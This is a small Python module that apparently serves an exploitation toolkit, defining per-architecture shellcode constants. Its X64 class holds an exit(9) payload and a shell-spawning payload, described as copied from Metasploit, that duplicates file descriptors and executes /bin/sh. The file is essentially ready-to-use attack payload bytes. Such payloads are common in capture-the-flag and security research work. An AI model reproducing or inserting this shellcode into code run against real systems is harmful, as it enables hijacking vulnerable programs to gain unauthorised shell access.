"""
Classes abstracting out the necessary components for varying architectures
"""


class Architecture(object):
    shell = ""

class X64(Architecture):
    # exit 9 x64 shellcode
    exit_9 = "\x48\x31\xc0\xb0\x09\x48\x89\xc7\xb0\x3c\x0f\x05"

    # copied directly from Metasploit
    # start shell x64 shellcode
    shell    =  "\x6a\x03"                     + \
                "\x5e"                         + \
                "\x48\xff\xce"                 + \
                "\x6a\x21"                     + \
                "\x58"                         + \
                "\x0f\x05"                     + \
                "\x75\xf6"                     + \
                "\x6a\x3b"                     + \
                "\x58"                         + \
                "\x99"                         + \
                "\x48\xbb\x2f\x62\x69\x6e\x2f" + \
                "\x73\x68\x00"                 + \
                "\x53"                         + \
                "\x48\x89\xe7"                 + \
                "\x52"                         + \
                "\x57"                         + \
                "\x48\x89\xe6"                 + \
                "\x0f\x05"
